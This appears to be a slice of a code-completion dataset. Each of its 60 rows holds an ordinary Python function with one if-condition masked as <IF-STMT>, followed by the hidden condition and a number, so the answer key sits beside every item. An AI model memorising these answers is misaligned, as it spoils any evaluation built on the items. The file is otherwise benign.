4046,"def L_op(self, inputs, outputs, gout):<tab>(x,) = inputs<tab>(gz,) = gout<tab>if x.type in complex_types:<tab><tab>raise NotImplementedError()<tab>if outputs[0].type in discrete_types:<tab><tab><IF-STMT><tab><tab><tab>return [x.zeros_like(dtype=theano.config.floatX)]<tab><tab>else:<tab><tab><tab>return [x.zeros_like()]<tab>return (gz / (np.cast[x.type](1) - sqr(x)),)",if x . type in discrete_types :,130
4047,"def _which(cls, progname):<tab>progname = progname.lower()<tab>for p in cls.env.path:<tab><tab>for ext in cls._EXTENSIONS:<tab><tab><tab>fn = p / (progname + ext)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return fn<tab>return None","if fn . access ( ""x"" ) and not fn . is_dir ( ) :",81
4048,"def iterate(self, prod_, rule_):<tab>newProduction = """"<tab>for i in range(len(prod_)):<tab><tab>step = self.production[i]<tab><tab>if step == ""W"":<tab><tab><tab>newProduction = newProduction + self.ruleW<tab><tab>elif step == ""X"":<tab><tab><tab>newProduction = newProduction + self.ruleX<tab><tab><IF-STMT><tab><tab><tab>newProduction = newProduction + self.ruleY<tab><tab>elif step == ""Z"":<tab><tab><tab>newProduction = newProduction + self.ruleZ<tab><tab>elif step != ""F"":<tab><tab><tab>newProduction = newProduction + step<tab>self.drawLength = self.drawLength * 0.5<tab>self.generations += 1<tab>return newProduction","elif step == ""Y"" :",179
4049,"def update(self, mapping, update_only=False):<tab>for name in mapping:<tab><tab>if update_only and name in self:<tab><tab><tab># nested and inner objects, merge recursively<tab><tab><tab>if hasattr(self[name], ""update""):<tab><tab><tab><tab># FIXME only merge subfields, not the settings<tab><tab><tab><tab>self[name].update(mapping[name], update_only)<tab><tab><tab>continue<tab><tab>self.field(name, mapping[name])<tab>if update_only:<tab><tab>for name in mapping._meta:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self._meta[name] = mapping._meta[name]<tab>else:<tab><tab>self._meta.update(mapping._meta)",if name not in self . _meta :,175
4050,"def Flatten(self, metadata, value_to_flatten):<tab>if metadata:<tab><tab>self.metadata = metadata<tab>for desc in value_to_flatten.type_infos:<tab><tab>if desc.name == ""metadata"":<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>setattr(self, desc.name, getattr(value_to_flatten, desc.name))","if hasattr ( self , desc . name ) and value_to_flatten . HasField ( desc . name ) :",108
4051,"def addnode(self, parent, data):<tab>print(""aaa"", data)<tab>for i in data:<tab><tab>print(i)<tab><tab>if i == ""-"":<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>item = self.tre_plugins.AppendItem(parent, i[0].title)<tab><tab><tab>self.tre_plugins.SetItemData(item, i[0])<tab><tab><tab>self.addnode(item, i[1])<tab><tab>else:<tab><tab><tab>item = self.tre_plugins.AppendItem(parent, i[0].title)<tab><tab><tab>self.tre_plugins.SetItemData(item, i[0])","if isinstance ( i , tuple ) :",159
4052,"def load_timer(string):<tab>if ""."" not in string:<tab><tab>raise argparse.ArgumentTypeError(<tab><tab><tab>""Value for --benchmark-timer must be in dotted form. Eg: 'module.attr'.""<tab><tab>)<tab>mod, attr = string.rsplit(""."", 1)<tab>if mod == ""pep418"":<tab><tab><IF-STMT><tab><tab><tab>import time<tab><tab><tab>return NameWrapper(getattr(time, attr))<tab><tab>else:<tab><tab><tab>from . import pep418<tab><tab><tab>return NameWrapper(getattr(pep418, attr))<tab>else:<tab><tab>__import__(mod)<tab><tab>mod = sys.modules[mod]<tab><tab>return NameWrapper(getattr(mod, attr))",if PY3 :,166
4053,"def _is_an_attribute(self, pyname):<tab>if pyname is not None and isinstance(pyname, pynames.AssignedName):<tab><tab>pymodule, lineno = self.pyname.get_definition_location()<tab><tab>scope = pymodule.get_scope().get_inner_scope_for_line(lineno)<tab><tab>if scope.get_kind() == ""Class"":<tab><tab><tab>return pyname in list(scope.get_names().values())<tab><tab>parent = scope.parent<tab><tab><IF-STMT><tab><tab><tab>return pyname in list(parent.get_names().values())<tab>return False","if parent is not None and parent . get_kind ( ) == ""Class"" :",157
4054,"def _format_arg(self, name, spec, value):<tab>if name == ""title"":<tab><tab>if isinstance(value, bool) and value:<tab><tab><tab>return ""--title""<tab><tab><IF-STMT><tab><tab><tab>return ""--title --title_text %s"" % (value,)<tab><tab>else:<tab><tab><tab>raise ValueError('Unknown value for ""title"" argument: ' + str(value))<tab>return super(Pik, self)._format_arg(name, spec, value)","elif isinstance ( value , str ) :",118
4055,"def total_form_count(self):<tab>""""""Returns the total number of forms in this FormSet.""""""<tab>if self.is_bound:<tab><tab>return self.management_form.cleaned_data[TOTAL_FORM_COUNT]<tab>else:<tab><tab>initial_forms = self.initial_form_count()<tab><tab>total_forms = initial_forms + self.extra<tab><tab># Allow all existing related objects/inlines to be displayed,<tab><tab># but don't allow extra beyond max_num.<tab><tab><IF-STMT><tab><tab><tab>total_forms = initial_forms<tab><tab>elif total_forms > self.max_num >= 0:<tab><tab><tab>total_forms = self.max_num<tab>return total_forms",if initial_forms > self . max_num >= 0 :,178
4056,"def GetTestNamesFromSuites(test_suite):<tab>""""""Takes a list of test suites and returns a list of contained test names.""""""<tab>suites = [test_suite]<tab>test_names = []<tab>while suites:<tab><tab>suite = suites.pop()<tab><tab>for test in suite:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>suites.append(test)<tab><tab><tab>else:<tab><tab><tab><tab>test_names.append(test.id()[len(""gslib.tests.test_"") :])<tab>return test_names","if isinstance ( test , unittest . TestSuite ) :",135
4057,"def readArgs(self, node):<tab>res = {}<tab>for c in self.getChildrenOf(node):<tab><tab>val = c.getAttribute(""val"")<tab><tab><IF-STMT><tab><tab><tab>res[str(c.nodeName)] = self.modules[val]<tab><tab>elif val in self.mothers:<tab><tab><tab>res[str(c.nodeName)] = self.mothers[val]<tab><tab>elif val != """":<tab><tab><tab>res[str(c.nodeName)] = eval(val)<tab>return res",if val in self . modules :,130
4058,"def pop(self, k, default=Sentinel):<tab>with self._database.transaction():<tab><tab>node, is_single = self.convert_node(k)<tab><tab>try:<tab><tab><tab>res = self[k]<tab><tab>except KeyError:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise<tab><tab><tab>return default<tab><tab>del self[node]<tab>return res",if default is Sentinel :,93
4059,"def wrapped_strategy(self):<tab>if self.__wrapped_strategy is None:<tab><tab><IF-STMT><tab><tab><tab>raise InvalidArgument(<tab><tab><tab><tab>f""Expected definition to be a function but got {self.__definition!r} ""<tab><tab><tab><tab>f""of type {type(self.__definition).__name__} instead.""<tab><tab><tab>)<tab><tab>result = self.__definition()<tab><tab>if result is self:<tab><tab><tab>raise InvalidArgument(""Cannot define a deferred strategy to be itself"")<tab><tab>check_strategy(result, ""definition()"")<tab><tab>self.__wrapped_strategy = result<tab><tab>self.__definition = None<tab>return self.__wrapped_strategy",if not inspect . isfunction ( self . __definition ) :,160
4060,"def _on_fullscreen_requested(self, on):<tab>if not config.val.content.fullscreen.window:<tab><tab><IF-STMT><tab><tab><tab>self.state_before_fullscreen = self.windowState()<tab><tab><tab>self.setWindowState(<tab><tab><tab><tab>Qt.WindowFullScreen<tab><tab><tab><tab>| self.state_before_fullscreen  # type: ignore[arg-type]<tab><tab><tab>)  # type: ignore[operator]<tab><tab>elif self.isFullScreen():<tab><tab><tab>self.setWindowState(self.state_before_fullscreen)<tab>log.misc.debug(<tab><tab>""on: {}, state before fullscreen: {}"".format(<tab><tab><tab>on, debug.qflags_key(Qt, self.state_before_fullscreen)<tab><tab>)<tab>)",if on :,193
4061,"def update_defaults(self, *values, **kwargs):<tab>for value in values:<tab><tab>if type(value) == dict:<tab><tab><tab>self.DEFAULT_CONFIGURATION.update(value)<tab><tab>elif isinstance(value, types.ModuleType):<tab><tab><tab>self.__defaults_from_module(value)<tab><tab>elif isinstance(value, str):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.__defaults_from_file(value)<tab><tab><tab>else:<tab><tab><tab><tab>logger.warning(""Configuration file {} does not exist."".format(value))<tab><tab>elif isinstance(value, type(None)):<tab><tab><tab>pass<tab><tab>else:<tab><tab><tab>raise ValueError(""Cannot interpret {}"".format(value))<tab>self.DEFAULT_CONFIGURATION.update(kwargs)",if os . path . exists ( value ) :,184
4062,"def clear_output_directory(self):<tab>files = os.listdir(os.path.join(""functional"", ""output""))<tab>for f in files:<tab><tab>if f in (""README.txt"", "".svn"", ""CVS""):<tab><tab><tab>continue  # don't touch the infrastructure<tab><tab>path = os.path.join(""functional"", ""output"", f)<tab><tab><IF-STMT><tab><tab><tab>shutil.rmtree(path)<tab><tab>else:<tab><tab><tab>os.remove(path)",if os . path . isdir ( path ) :,121
4063,"def do_remove(self):<tab>if self.netconf.locked(""dhcp""):<tab><tab><IF-STMT><tab><tab><tab>pid = read_pid_file(""/var/run/udhcpd.pan1.pid"")<tab><tab>else:<tab><tab><tab>pid = self.pid<tab><tab>if not kill(pid, ""udhcpd""):<tab><tab><tab>logging.info(""Stale dhcp lockfile found"")<tab><tab>self.netconf.unlock(""dhcp"")",if not self . pid :,110
4064,"def __getattr__(self, attr):<tab>if attr.endswith(""[]""):<tab><tab>searchName = attr[:-2]<tab>else:<tab><tab>searchName = attr<tab>with _lazyLock:<tab><tab>nestedClasses = _dependencyMap.get(self.__name__, [])<tab><tab><IF-STMT><tab><tab><tab>return GetVmodlType(self.__name__ + ""."" + attr)<tab><tab>else:<tab><tab><tab>return super(LazyType, self).__getattribute__(attr)",if searchName in nestedClasses :,113
4065,"def allow_request(self, request, view):<tab>request.server = None<tab>allow = True<tab>view_name = view.get_view_name()<tab>allowed_views = [u""System Data"", u""Collectd Data"", u""Legacy System Data""]<tab>if view_name in allowed_views:<tab><tab>server_key = view.kwargs.get(""server_key"")<tab><tab>server = server_model.get_server_by_key(server_key)<tab><tab><IF-STMT><tab><tab><tab>request.server = server  # Needed in the Models<tab><tab><tab>server_status = throttle_status(server=server)<tab><tab><tab>if server_status.allow == False:<tab><tab><tab><tab>allow = False<tab>return allow",if server :,173
4066,"def serve_until_stopped(self):<tab>import select<tab>abort = 0<tab>while not abort:<tab><tab>rd, wr, ex = select.select([self.socket.fileno()], [], [], self.timeout)<tab><tab><IF-STMT><tab><tab><tab>self.handle_request()<tab><tab>logging._acquireLock()<tab><tab>abort = self.abort<tab><tab>logging._releaseLock()",if rd :,90
4067,"def A(*args):<tab>if len(args) > 0 and hasattr(args[0], ""__iter__""):  # Iterable as argument<tab><tab><IF-STMT><tab><tab><tab>return np.array(list(args), dtype=np.float32)<tab><tab>else:<tab><tab><tab># Flatten arguments into one list<tab><tab><tab>l = list(args[0])<tab><tab><tab>for e in args[1:]:<tab><tab><tab><tab>if hasattr(e, ""__iter__""):<tab><tab><tab><tab><tab>l.extend(e)<tab><tab><tab><tab>else:<tab><tab><tab><tab><tab>l.append(e)<tab><tab><tab>return np.array(l, dtype=np.float32)<tab>return np.array(list(args), dtype=np.float32)",if len ( args ) == 1 :,179
4068,"def _fix(self):<tab>op = []<tab>for k in range(self.size):<tab><tab>o = random.choice(self._opts)<tab><tab><IF-STMT><tab><tab><tab>op.append((o, self.rndstr * 1))<tab><tab>else:<tab><tab><tab>op.append((o.name, o.randval()._fix()))<tab>return op",if type ( o ) is str :,92
4069,"def lint_dynamic(self, rule):<tab>for file in chain(rule.output, rule.input):<tab><tab><IF-STMT><tab><tab><tab>yield Lint(<tab><tab><tab><tab>title=""The dynamic flag is deprecated"",<tab><tab><tab><tab>body=""Use checkpoints instead, which are more powerful and less error-prone."",<tab><tab><tab><tab>links=[links.checkpoints],<tab><tab><tab>)","if is_flagged ( file , ""dynamic"" ) :",100
4070,"def visit(ignored, dir, files):<tab>if os.path.basename(dir) not in test_names:<tab><tab>for name in test_names:<tab><tab><tab>if name + "".py"" in files:<tab><tab><tab><tab>path = os.path.join(dir, name + "".py"")<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>results.append(path)<tab><tab>return<tab>if ""__init__.py"" not in files:<tab><tab>stderr(""%s is not a package"" % dir)<tab><tab>return<tab>for file in files:<tab><tab>if file.startswith(""test"") and file.endswith("".py""):<tab><tab><tab>path = os.path.join(dir, file)<tab><tab><tab>if matcher(path[baselen:]):<tab><tab><tab><tab>results.append(path)",if matcher ( path [ baselen : ] ) :,194
4071,"def wrapped(*args, **kwargs):<tab>try:<tab><tab>func(*args, **kwargs)<tab>except AssertionError as e:<tab><tab><IF-STMT><tab><tab><tab>time.sleep(t_interval)<tab><tab><tab>retry_assertion(interval=t_interval, retries=t_retries - 1)(func)(<tab><tab><tab><tab>*args, **kwargs<tab><tab><tab>)<tab><tab>else:<tab><tab><tab>raise e",if retries :,98
4072,"def num2binary(l, bits=32):<tab>all = []<tab>bin = """"<tab>for i in range(bits):<tab><tab>if l & 0x1:<tab><tab><tab>bin = ""1"" + bin<tab><tab>else:<tab><tab><tab>bin = ""0"" + bin<tab><tab>l = l >> 1<tab><tab><IF-STMT><tab><tab><tab>all.append(bin)<tab><tab><tab>bin = """"<tab>if bin:<tab><tab>all.append(bin)<tab>all.reverse()<tab>assert l in (0, -1), ""number doesn't fit in number of bits""<tab>return string.join(all, "" "")",if not ( ( i + 1 ) % 8 ) :,158
4073,"def closest_enemy_ant(self, row1, col1, filter=None):<tab># find the closest enemy ant from this row/col<tab>min_dist = maxint<tab>closest_ant = None<tab>for ant in self.enemy_ants():<tab><tab>if filter is None or ant not in filter:<tab><tab><tab>dist = self.distance(row1, col1, ant[0][0], ant[0][1])<tab><tab><tab><IF-STMT><tab><tab><tab><tab>min_dist = dist<tab><tab><tab><tab>closest_ant = ant[0]<tab>return closest_ant",if dist < min_dist :,146
4074,"def _wrap(cls, parent, value):<tab>if isinstance(value, dict):<tab><tab># we know that `annotations` and `labels` are dicts and therefore don't want to convert them into K8sObject<tab><tab>return (<tab><tab><tab>value<tab><tab><tab><IF-STMT><tab><tab><tab>and all(isinstance(v, six.string_types) for v in value.values())<tab><tab><tab>else cls(value)<tab><tab>)<tab>elif isinstance(value, list):<tab><tab>return [cls._wrap(None, v) for v in value]<tab>else:<tab><tab>return value","if parent in { ""annotations"" , ""labels"" }",145
4075,"def do_definition(tag):<tab>w.end_para()<tab>macro("".TP"")<tab>w.started = True<tab>split = 0<tab>pre = []<tab>post = []<tab>for typ, text in _bitlist(tag):<tab><tab><IF-STMT><tab><tab><tab>post.append((typ, text))<tab><tab>elif text.lstrip().startswith("": ""):<tab><tab><tab>split = 1<tab><tab><tab>post.append((typ, text.lstrip()[2:].lstrip()))<tab><tab>else:<tab><tab><tab>pre.append((typ, text))<tab>_boldline(pre)<tab>w.write(_text(post))<tab>w.started = False",if split :,153
4076,"def updateTree(self, v, x, y, h, level):<tab>yfirst = y<tab>if level == 0:<tab><tab>yfirst += 10<tab>while v:<tab><tab># g.trace(x,y,v)<tab><tab>h, indent = self.updateNode(v, x, y)<tab><tab>y += h<tab><tab><IF-STMT><tab><tab><tab>y = self.updateTree(v.firstChild(), x + indent, y, h, level + 1)<tab><tab>v = v.next()<tab>return y",if v . isExpanded ( ) and v . firstChild ( ) :,138
4077,def loop(self):<tab>while True:<tab><tab>job = self.check_queue()<tab><tab><IF-STMT><tab><tab><tab>time.sleep(20)<tab><tab><tab>continue<tab><tab>self.run_job(job)<tab><tab>time.sleep(5),if not job :,64
4078,"def _name_to_variable(self, name):<tab>r""""""Find the corresponding variable given the specified name.""""""<tab>pointer = self<tab>for m_name in name.split("".""):<tab><tab><IF-STMT><tab><tab><tab>num = int(m_name)<tab><tab><tab>pointer = pointer[num]  # type: ignore<tab><tab>else:<tab><tab><tab>pointer = getattr(pointer, m_name)<tab>return pointer  # type: ignore",if m_name . isdigit ( ) :,107
4079,"def fetch_cleanup(self):<tab>for cell in self.cover_cells:<tab><tab><IF-STMT><tab><tab><tab>log.debug(<tab><tab><tab><tab>""Removing cover art fetch task for %s"",<tab><tab><tab><tab>cell.release[""musicbrainz_albumid""],<tab><tab><tab>)<tab><tab><tab>self.tagger.webservice.remove_task(cell.fetch_task)",if cell . fetch_task is not None :,95
4080,"def _get_lcmap_info(self, vol_name):<tab>ret_vals = {<tab><tab>""fc_id"": """",<tab><tab>""fc_name"": """",<tab><tab>""lc_map_count"": ""0"",<tab>}<tab>for lcmap in self._lcmappings_list.values():<tab><tab><IF-STMT><tab><tab><tab>ret_vals[""fc_id""] = lcmap[""id""]<tab><tab><tab>ret_vals[""fc_name""] = lcmap[""name""]<tab><tab><tab>ret_vals[""lc_map_count""] = ""1""<tab>return ret_vals","if ( lcmap [ ""source"" ] == vol_name ) or ( lcmap [ ""target"" ] == vol_name ) :",159
4081,"def on_event_clicked(self, widget, event):<tab>if event.type == Gdk.EventType.BUTTON_PRESS and event.button == 3:<tab><tab>path = self.get_path_at_pos(int(event.x), int(event.y))<tab><tab>if path is not None:<tab><tab><tab>row = self.get(path[0], ""device"")<tab><tab><tab>if row:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>if self.menu is None:<tab><tab><tab><tab><tab><tab>self.menu = ManagerDeviceMenu(self.Blueman)<tab><tab><tab><tab><tab>self.menu.popup(None, None, None, None, event.button, event.time)",if self . Blueman is not None :,170
4082,"def _find_node_with_predicate(self, node, predicate):<tab>if node != self._tree._root and predicate(node):<tab><tab>return node<tab>item, cookie = self._tree.GetFirstChild(node)<tab>while item:<tab><tab>if predicate(item):<tab><tab><tab>return item<tab><tab><IF-STMT><tab><tab><tab>result = self._find_node_with_predicate(item, predicate)<tab><tab><tab>if result:<tab><tab><tab><tab>return result<tab><tab>item, cookie = self._tree.GetNextChild(node, cookie)<tab>return None",if self . _tree . ItemHasChildren ( item ) :,143
4083,"def expect_flow_sequence_item(self):<tab>if isinstance(self.event, SequenceEndEvent):<tab><tab>self.indent = self.indents.pop()<tab><tab>self.flow_level -= 1<tab><tab>if self.canonical:<tab><tab><tab>self.write_indicator(u"","", False)<tab><tab><tab>self.write_indent()<tab><tab>self.write_indicator(u""]"", False)<tab><tab>self.state = self.states.pop()<tab>else:<tab><tab>self.write_indicator(u"","", False)<tab><tab><IF-STMT><tab><tab><tab>self.write_indent()<tab><tab>self.states.append(self.expect_flow_sequence_item)<tab><tab>self.expect_node(sequence=True)",if self . canonical or self . column > self . best_width :,185
4084,"def iteration(pts):<tab>n = len(pts)<tab>all_pts = pts + invert(pts)<tab>diagram = Voronoi(all_pts)<tab>vertices = restrict(diagram.vertices)<tab>centers = []<tab>for site_idx in range(n):<tab><tab>region_idx = diagram.point_region[site_idx]<tab><tab>region = diagram.regions[region_idx]<tab><tab><IF-STMT><tab><tab><tab>site = pts[site_idx]<tab><tab><tab>centers.append(site)<tab><tab><tab>continue<tab><tab>region_verts = np.array([vertices[i] for i in region])<tab><tab>center = weighted_center(region_verts, weight_field)<tab><tab>centers.append(tuple(center))<tab>return centers",if - 1 in region :,185
4085,"def retry_call(self, key, f, time_expire, with_lock):<tab>self.RETRIES += 1<tab>if self.RETRIES <= self.MAX_RETRIES:<tab><tab><IF-STMT><tab><tab><tab>self.RETRIES = 0<tab><tab><tab>return f()<tab><tab>logger.error(""sleeping %s seconds before reconnecting"" % (2 * self.RETRIES))<tab><tab>time.sleep(2 * self.RETRIES)<tab><tab>return self.__call__(key, f, time_expire, with_lock)<tab>else:<tab><tab>self.RETRIES = 0<tab><tab>if self.fail_gracefully:<tab><tab><tab>return f<tab><tab>raise RConnectionError(""Redis instance is unavailable"")",if self . fail_gracefully :,165
4086,"def load_model(<tab>self, model_name: str, path: str = None, model_type=None) -> AbstractModel:<tab>if isinstance(model_name, AbstractModel):<tab><tab>return model_name<tab>if model_name in self.models.keys():<tab><tab>return self.models[model_name]<tab>else:<tab><tab><IF-STMT><tab><tab><tab>path = self.get_model_attribute(model=model_name, attribute=""path"")<tab><tab>if model_type is None:<tab><tab><tab>model_type = self.get_model_attribute(model=model_name, attribute=""type"")<tab><tab>return model_type.load(path=path, reset_paths=self.reset_paths)",if path is None :,170
4087,"def _GetPathType(<tab>args: rdf_artifacts.ArtifactCollectorFlowArgs, client_os: str) -> rdf_paths.PathSpec.PathType:<tab>if args.use_tsk or args.use_raw_filesystem_access:<tab><tab><IF-STMT><tab><tab><tab>return config.CONFIG[""Server.raw_filesystem_access_pathtype""]<tab><tab>else:<tab><tab><tab>return rdf_paths.PathSpec.PathType.TSK<tab>else:<tab><tab>return rdf_paths.PathSpec.PathType.OS","if client_os == ""Windows"" :",128
4088,"def iter_links(self):<tab># type: () -> Iterable[Link]<tab>""""""Yields all links in the page""""""<tab>document = html5lib.parse(<tab><tab>self.content,<tab><tab>transport_encoding=_get_encoding_from_headers(self.headers),<tab><tab>namespaceHTMLElements=False,<tab>)<tab>base_url = _determine_base_url(document, self.url)<tab>for anchor in document.findall("".//a""):<tab><tab>link = _create_link_from_element(<tab><tab><tab>anchor,<tab><tab><tab>page_url=self.url,<tab><tab><tab>base_url=base_url,<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>yield link",if link is None :,175
4089,"def on_leave(<tab>self, original_node: CSTNodeT, updated_node: CSTNodeT) -> Union[cst.Import, cst.ImportFrom, CSTNodeT, RemovalSentinel]:<tab>if isinstance(updated_node, cst.Import):<tab><tab>for alias in updated_node.names:<tab><tab><tab>name = alias.name<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return cst.RemoveFromParent()<tab>elif isinstance(updated_node, cst.ImportFrom):<tab><tab>module = updated_node.module<tab><tab>if isinstance(module, cst.Name) and module.value == ""e"":<tab><tab><tab>return cst.RemoveFromParent()<tab>return updated_node","if isinstance ( name , cst . Name ) and name . value == ""b"" :",183
4090,"def http_request(self, request):<tab>ntlm_auth_header = request.get_header(self.auth_header, None)<tab>if ntlm_auth_header is None:<tab><tab>user, pw = self.passwd.find_user_password(None, request.get_full_url())<tab><tab><IF-STMT><tab><tab><tab>auth = ""NTLM %s"" % ntlm.create_NTLM_NEGOTIATE_MESSAGE(user)<tab><tab><tab>request.add_unredirected_header(self.auth_header, auth)<tab>return request",if pw is not None :,137
4091,"def _parse_yum_or_zypper_repositories(output):<tab>repos = []<tab>current_repo = {}<tab>for line in output:<tab><tab>line = line.strip()<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>if line.startswith(""[""):<tab><tab><tab>if current_repo:<tab><tab><tab><tab>repos.append(current_repo)<tab><tab><tab><tab>current_repo = {}<tab><tab><tab>current_repo[""name""] = line[1:-1]<tab><tab>if current_repo and ""="" in line:<tab><tab><tab>key, value = line.split(""="", 1)<tab><tab><tab>current_repo[key] = value<tab>if current_repo:<tab><tab>repos.append(current_repo)<tab>return repos","if not line or line . startswith ( ""#"" ) :",179
4092,"def load_as_uint8(filename):<tab>image = gdal.Open(filename)<tab>image_array = np.array(image.ReadAsArray())<tab>image_uint8 = np.zeros(image_array.shape, dtype=np.uint8)<tab># rescale each band to be between 0, 255<tab>for k, band in enumerate(image_array):<tab><tab>band_max = np.max(band)<tab><tab><IF-STMT><tab><tab><tab>band = band.astype(np.float) / band_max * 255.0<tab><tab>image_uint8[k, :, :] = band<tab>return image_uint8",if band_max != 0 :,153
4093,"def _get_resource_group_name_of_staticsite(client, static_site_name):<tab>static_sites = client.list()<tab>for static_site in static_sites:<tab><tab>if static_site.name.lower() == static_site_name.lower():<tab><tab><tab>resource_group = _parse_resource_group_from_arm_id(static_site.id)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return resource_group<tab>raise CLIError(<tab><tab>""Static site was '{}' not found in subscription."".format(static_site_name)<tab>)",if resource_group :,144
4094,"def _translate_trace_addr(self, trace_addr, obj=None):<tab>if obj is None:<tab><tab>for obj in self._aslr_slides:  # pylint: disable=redefined-argument-from-local<tab><tab><tab><IF-STMT><tab><tab><tab><tab>break<tab><tab>else:<tab><tab><tab>raise Exception(""Can't figure out which object this address belongs to"")<tab>if obj not in self._aslr_slides:<tab><tab>raise Exception(""Internal error: object is untranslated"")<tab>return trace_addr - self._aslr_slides[obj]",if obj . contains_addr ( trace_addr - self . _aslr_slides [ obj ] ) :,149
4095,"def _register_builtin_handlers(self, events):<tab>for spec in handlers.BUILTIN_HANDLERS:<tab><tab>if len(spec) == 2:<tab><tab><tab>event_name, handler = spec<tab><tab><tab>self.register(event_name, handler)<tab><tab>else:<tab><tab><tab>event_name, handler, register_type = spec<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self._events.register_first(event_name, handler)<tab><tab><tab>elif register_type is handlers.REGISTER_LAST:<tab><tab><tab><tab>self._events.register_last(event_name, handler)",if register_type is handlers . REGISTER_FIRST :,148
4096,"def __fixdict(self, dict):<tab>for key in dict.keys():<tab><tab>if key[:6] == ""start_"":<tab><tab><tab>tag = key[6:]<tab><tab><tab>start, end = self.elements.get(tag, (None, None))<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.elements[tag] = getattr(self, key), end<tab><tab>elif key[:4] == ""end_"":<tab><tab><tab>tag = key[4:]<tab><tab><tab>start, end = self.elements.get(tag, (None, None))<tab><tab><tab>if end is None:<tab><tab><tab><tab>self.elements[tag] = start, getattr(self, key)",if start is None :,162
4097,"def metadata(draft):<tab>test_metadata = {}<tab>json_schema = create_jsonschema_from_metaschema(draft.registration_schema.schema)<tab>for key, value in json_schema[""properties""].items():<tab><tab>response = ""Test response""<tab><tab>items = value[""properties""][""value""].get(""items"")<tab><tab>enum = value[""properties""][""value""].get(""enum"")<tab><tab>if items:  # multiselect<tab><tab><tab>response = [items[""enum""][0]]<tab><tab><IF-STMT>  # singleselect<tab><tab><tab>response = enum[0]<tab><tab>elif value[""properties""][""value""].get(""properties""):<tab><tab><tab>response = {""question"": {""value"": ""Test Response""}}<tab><tab>test_metadata[key] = {""value"": response}<tab>return test_metadata",elif enum :,185
4098,"def par_iter_next_batch(self, batch_ms: int):<tab>""""""Batches par_iter_next.""""""<tab>batch = []<tab>if batch_ms == 0:<tab><tab>batch.append(self.par_iter_next())<tab><tab>return batch<tab>t_end = time.time() + (0.001 * batch_ms)<tab>while time.time() < t_end:<tab><tab>try:<tab><tab><tab>batch.append(self.par_iter_next())<tab><tab>except StopIteration:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise StopIteration<tab><tab><tab>else:<tab><tab><tab><tab>pass<tab>return batch",if len ( batch ) == 0 :,157
4099,"def get_node_map(self, nodes: List[Node], left_node_only=True):<tab>node_map = {}<tab>idx = 0<tab>for node in nodes:<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>node_map[node.id] = idx<tab><tab>idx += 1<tab>return node_map",if node . id != 0 and ( not node . is_left_node and left_node_only ) :,99
4100,"def compare_objects(left, right):<tab>left_fields = left.map_value.fields<tab>right_fields = right.map_value.fields<tab>for left_key, right_key in zip(sorted(left_fields), sorted(right_fields)):<tab><tab>keyCompare = Order._compare_to(left_key, right_key)<tab><tab><IF-STMT><tab><tab><tab>return keyCompare<tab><tab>value_compare = Order.compare(left_fields[left_key], right_fields[right_key])<tab><tab>if value_compare != 0:<tab><tab><tab>return value_compare<tab>return Order._compare_to(len(left_fields), len(right_fields))",if keyCompare != 0 :,163
4101,"def _resolve_policy_id(cmd, policy, policy_set_definition, client):<tab>policy_id = policy or policy_set_definition<tab>if not is_valid_resource_id(policy_id):<tab><tab><IF-STMT><tab><tab><tab>policy_def = _get_custom_or_builtin_policy(cmd, client, policy)<tab><tab><tab>policy_id = policy_def.id<tab><tab>else:<tab><tab><tab>policy_set_def = _get_custom_or_builtin_policy(<tab><tab><tab><tab>cmd, client, policy_set_definition, None, None, True<tab><tab><tab>)<tab><tab><tab>policy_id = policy_set_def.id<tab>return policy_id",if policy :,166
4102,"def _passes_cortex_depth(line, min_depth):<tab>""""""Do any genotypes in the cortex_var VCF line passes the minimum depth requirement?""""""<tab>parts = line.split(""\t"")<tab>cov_index = parts[8].split("":"").index(""COV"")<tab>passes_depth = False<tab>for gt in parts[9:]:<tab><tab>cur_cov = gt.split("":"")[cov_index]<tab><tab>cur_depth = sum(int(x) for x in cur_cov.split("",""))<tab><tab><IF-STMT><tab><tab><tab>passes_depth = True<tab>return passes_depth",if cur_depth >= min_depth :,149
4103,"def __init__(self, itemtype, cnf={}, *, master=None, **kw):<tab><IF-STMT><tab><tab>if ""refwindow"" in kw:<tab><tab><tab>master = kw[""refwindow""]<tab><tab>elif ""refwindow"" in cnf:<tab><tab><tab>master = cnf[""refwindow""]<tab><tab>else:<tab><tab><tab>master = tkinter._default_root<tab><tab><tab>if not master:<tab><tab><tab><tab>raise RuntimeError(<tab><tab><tab><tab><tab>""Too early to create display style: "" ""no root window""<tab><tab><tab><tab>)<tab>self.tk = master.tk<tab>self.stylename = self.tk.call(""tixDisplayStyle"", itemtype, *self._options(cnf, kw))",if not master :,167
4104,"def serialize_groups_for_summary(node):<tab>groups = node.osf_groups<tab>n_groups = len(groups)<tab>group_string = """"<tab>for index, group in enumerate(groups):<tab><tab><IF-STMT><tab><tab><tab>separator = """"<tab><tab>elif index == n_groups - 2:<tab><tab><tab>separator = "" & ""<tab><tab>else:<tab><tab><tab>separator = "", ""<tab><tab>group_string = group_string + group.name + separator<tab>return group_string",if index == n_groups - 1 :,125
4105,"def do(txn):<tab>txn.execute(<tab><tab>""SELECT valid_to, mode, caseset, spec FROM testspec WHERE id = ?"", [specId]<tab>)<tab>row = txn.fetchone()<tab>if row is None:<tab><tab>raise Exception(""no test specification with ID '%s'"" % specId)<tab>else:<tab><tab>validTo, mode, caseset, spec = row<tab><tab>if validTo is not None:<tab><tab><tab>raise Exception(""test spec no longer active"")<tab><tab><IF-STMT><tab><tab><tab>raise Exception(""case set %s not loaded in database"" % caseset)<tab><tab>spec = json.loads(spec)<tab><tab>res = self._css[caseset].generateCasesByTestee(spec)<tab><tab>return res",if not self . _css . has_key ( caseset ) :,188
